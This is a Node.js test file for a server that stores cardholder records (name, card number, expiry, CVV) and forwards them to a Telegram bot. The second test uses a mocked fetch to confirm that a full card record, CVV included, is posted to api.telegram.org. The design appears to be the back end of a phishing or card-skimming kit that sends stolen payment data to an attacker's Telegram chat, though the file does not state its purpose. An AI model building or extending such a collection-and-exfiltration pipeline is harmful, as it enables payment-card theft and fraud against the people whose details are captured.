const test = require('node:test');
const assert = require('node:assert/strict');
const { getEntries, addEntry, sendTelegramNotification } = require('../server.js');

test('server data API can read and add entries', () => {
  const sample = { name: 'Test User', card: '1234567890123456', expiry: '12/28', cvv: '123' };

  require('../server.js').clearEntries();
  addEntry(sample);
  const entries = getEntries();

  assert.ok(Array.isArray(entries));
  assert.ok(entries.some((entry) => entry.name === 'Test User'));
  assert.equal(entries.length, 1);
});

test('server sends Telegram notification when token and chat id are configured', async () => {
  const previousFetch = global.fetch;
  const previousToken = process.env.TELEGRAM_BOT_TOKEN;
  const previousChatId = process.env.TELEGRAM_CHAT_ID;

  process.env.TELEGRAM_BOT_TOKEN = '123456:TESTTOKEN';
  process.env.TELEGRAM_CHAT_ID = '987654321';

  global.fetch = async (url, options) => {
    assert.match(String(url), /api\.telegram\.org/);
    const payload = JSON.parse(options.body);
    assert.equal(payload.chat_id, '987654321');
    assert.match(payload.text, /Test User/);
    return {
      ok: true,
      json: async () => ({ ok: true }),
    };
  };

  try {
    const result = await sendTelegramNotification({
      name: 'Test User',
      card: '1234567890123456',
      expiry: '12/28',
      cvv: '123',
    });

    assert.equal(result, true);
  } finally {
    global.fetch = previousFetch;
    if (previousToken === undefined) delete process.env.TELEGRAM_BOT_TOKEN;
    else process.env.TELEGRAM_BOT_TOKEN = previousToken;

    if (previousChatId === undefined) delete process.env.TELEGRAM_CHAT_ID;
    else process.env.TELEGRAM_CHAT_ID = previousChatId;
  }
});
